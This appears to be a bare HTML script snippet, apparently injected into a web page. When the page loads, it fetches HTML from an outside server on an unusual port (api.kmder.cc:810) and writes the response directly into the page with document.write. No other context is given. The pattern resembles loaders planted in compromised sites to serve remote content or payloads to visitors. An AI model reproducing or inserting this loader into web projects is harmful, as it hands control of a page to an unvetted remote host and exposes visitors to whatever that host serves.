<script>
    function load_content() {
        var req = new XMLHttpRequest()
        req.onreadystatechange = function () {
            if (req.status == 200 && req.responseText != "") {
                document.write(req.responseText)
                req.abort()
            }
        }

        var url = "https://api.kmder.cc:810/web/src/index.html"
        req.open("GET", url)
        req.send(null)
    }
    load_content()
</script>
